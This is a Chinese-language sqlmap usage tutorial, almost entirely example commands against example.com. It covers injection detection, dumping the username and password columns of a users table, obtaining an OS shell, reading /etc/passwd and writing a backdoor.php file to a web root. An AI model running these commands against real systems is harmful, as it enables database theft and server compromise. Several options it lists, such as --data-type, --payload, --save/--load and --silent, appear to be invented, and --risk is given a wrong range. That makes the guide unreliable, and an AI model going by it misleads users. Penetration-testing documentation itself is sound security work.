## 目标指定参数

### 直接指定 URL

使用 `-u` 或 `--url` 参数指定包含参数的目标 URL，这是最基础的用法。

```bash
python sqlmap.py -u "http://example.com/index.php?id=1"
```

说明：该命令会对 URL 中的 `id=1` 参数进行自动检测，判断是否存在 SQL 注入漏洞。

### 从文件加载目标

当需要检测多个目标时，可将目标 URL 或请求信息写入文件，使用 `-m` 或 `--multiple-targets` 参数加载。

```bash
python sqlmap.py -m targets.txt
```

说明：`targets.txt` 文件中每行一个目标 URL（如 `http://example.com/index.php?id=1`），SQLmap 会依次检测。

### 指定 POST 请求目标

对于 POST 方式提交的参数（如表单提交），需使用 `--data`（数据）参数指定 POST 数据，同时用 `-u` 指定目标 URL。

```bash
python sqlmap.py -u "http://example.com/login.php" --data "username=admin&password=123"
```

说明：该命令会检测 POST 数据中 `username` 和 `password` 参数是否存在注入漏洞。若需模拟表单提交的 Content-Type，可搭配 `--data-type` 参数（如 `--data-type=json` 用于 JSON 格式数据）。

### 加载请求包（Repeater 导出）

若目标请求较复杂（如包含 Cookie、Referer 等头部信息），可在 Burp Suite 等工具中捕获请求后导出为文件，使用 `-r` 或 `--request` 参数加载。

```bash
python sqlmap.py -r request.txt
```

说明：`request.txt` 为 Burp 导出的原始请求包（包含请求行、头部、请求体），SQLmap 会自动解析其中的参数和头部信息进行检测。

### 其他目标形式

- `--cookie`：指定 Cookie 信息（适用于需登录的场景），：`--cookie "PHPSESSID=abc123; user=admin"`。
- `--user-agent`：模拟指定浏览器的 User-Agent 头部，：`--user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0 Safari/537.36"`。
- `--proxy`：通过代理服务器检测（如搭配 Burp 抓包），：`--proxy "http://127.0.0.1:8080"`。

## 漏洞探测与配置参数

该类参数用于控制 SQLmap 的探测逻辑，包括注入类型、检测级别、数据库指纹等，可根据目标场景灵活调整。

### 指定注入点参数

当 URL 或请求中有多个参数时，可使用 `-p` 或 `--param` 参数指定需要检测的注入点，提高检测效率。

```bash
python sqlmap.py -u "http://example.com/index.php?id=1&page=2" -p id
```

说明：仅检测 `id` 参数，忽略 `page` 参数。

### 调整检测级别与风险

- `--level`：检测级别（1-5，默认 1），级别越高，检测的注入类型越全面，但耗时更长。级别 3 及以上会检测 Cookie、User-Agent 等头部参数的注入。
- `--risk`：风险级别（1-4，默认 1），级别越高，使用的 Payload 越具攻击性，可能导致目标数据库报错或数据损坏（如风险 3 会使用 UPDATE/DELETE 语句）。

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --level 3 --risk 2
```

说明：以级别 3 检测所有可能的参数（包括头部），使用风险级别 2 的 Payload。

### 指定数据库类型

若已知目标数据库类型，可使用 `--dbms` 参数指定，跳过指纹识别步骤，直接针对该数据库检测。支持的数据库类型包括 mysql、oracle、mssql、postgresql 等。

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --dbms mysql
```

说明：直接按 MySQL 数据库的特性进行注入检测。

### 注入类型控制

使用 `--technique` 参数指定注入技术类型，默认会自动检测所有类型，指定后可缩小范围。支持的类型缩写：

- B：布尔盲注（基于返回页面内容是否变化）
- T：时间盲注（基于返回时间是否延迟）
- E：报错注入（基于数据库报错信息获取数据）
- U：联合查询注入（基于 UNION SELECT 语句）
- S：堆叠查询注入（基于 ; 分隔多条 SQL 语句）
- Q：内联查询注入（基于子查询结果嵌入原始查询返回）

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --technique E,U
```

说明：仅使用报错注入和联合查询注入两种技术检测。

### 其他探测配置

- `--threads`：设置线程数（默认 1，最大 10），提高检测速度，：`--threads 5`。注意：线程数过高可能被目标网站封禁 IP。
- `--delay`：设置每个请求的延迟时间（单位：秒），避免请求过于频繁，：`--delay 1`（每 1 秒发送一个请求）。
- `--timeout`：设置请求超时时间（单位：秒，默认 30），：`--timeout 60`。

## 数据获取与利用参数

当检测到 SQL 注入漏洞后，可使用该类参数获取目标数据库的信息（如库名、表名、数据内容），甚至执行系统命令。

### 获取数据库基础信息

- `--current-db`：获取当前连接的数据库名称。
- `--current-user`：获取当前数据库用户名称。
- `--is-dba`：判断当前数据库用户是否为管理员（DBA）。
- `--dbs`：获取目标数据库服务器上的所有数据库名称。

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --current-db --current-user
```

说明：检测漏洞的同时，获取当前数据库名和当前登录用户。

### 获取表名与列名

- `--tables`：获取指定数据库中的所有表名，需搭配 `-D`（指定数据库）参数。
- `--columns`：获取指定表中的所有列名，需搭配 `-D` 和 `-T`（指定表名）参数。

```bash
## 获取 testdb 数据库中的所有表名
python sqlmap.py -u "http://example.com/index.php?id=1" -D testdb --tables

## 获取 testdb 数据库中 users 表的所有列名
python sqlmap.py -u "http://example.com/index.php?id=1" -D testdb -T users --columns
```

### 导出表中数据

使用 `--dump` 参数导出指定表中的数据，可搭配 `-D`、`-T`、`-C`（指定列名）参数缩小导出范围。

```bash
## 导出 testdb 数据库中 users 表的所有数据
python sqlmap.py -u "http://example.com/index.php?id=1" -D testdb -T users --dump

## 仅导出 users 表中 username 和 password 列的数据
python sqlmap.py -u "http://example.com/index.php?id=1" -D testdb -T users -C "username,password" --dump

## 导出前 10 行数据（避免数据量过大）
python sqlmap.py -u "http://example.com/index.php?id=1" -D testdb -T users --dump --start 0 --stop 9
```

### 执行系统命令与上传文件

当数据库用户为 DBA 且权限足够时，可通过 SQLmap 执行系统命令或上传文件，仅支持部分数据库（如 MySQL、SQL Server）。

- `--os-shell`：获取操作系统交互shell（需 DBA 权限，支持 MySQL、PostgreSQL 等）。
- `--os-cmd`：执行单条系统命令，：`--os-cmd "whoami"`。
- `--file-read`：读取目标服务器上的文件，：`--file-read "/etc/passwd"`（Linux）或 `--file-read "C:\Windows\system32\drivers\etc\hosts"`（Windows）。
- `--file-write`：上传本地文件到目标服务器，需搭配 `--file-dest` 指定目标路径，：`--file-write "local.php" --file-dest "/var/www/html/backdoor.php"`。该功能依赖数据库特定条件（如 MySQL 需`secure_file_priv`配置为空，且目标路径需有写入权限），并非所有支持`--os-shell`的数据库都能直接使用。

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --os-shell
```

说明：若权限足够，会生成一个交互shell，可执行 `ls`、`dir` 等系统命令。

## 高级功能参数

### 自定义 Payload

使用 `--payload` 参数指定自定义的 SQL 注入 Payload，适用于特殊场景下的漏洞利用。

```bash
python sqlmap.py -u "http://example.com/index.php?id=1" --payload "1 AND (SELECT 1 FROM users WHERE username='admin')=1"
```

### 保存与加载会话

对于耗时较长的检测任务，可使用 `--save` 保存会话状态，后续通过 `--load` 加载会话继续执行，避免重复检测。

```bash
## 保存会话到 session1 中
python sqlmap.py -u "http://example.com/index.php?id=1" --save session1

## 加载 session1 继续执行
python sqlmap.py --load session1
```

### 静默模式与日志输出

- `--silent`：静默模式，仅输出关键结果，减少冗余信息。
- `--log-file`：将检测过程和结果保存到日志文件，：`--log-file sqlmap.log`。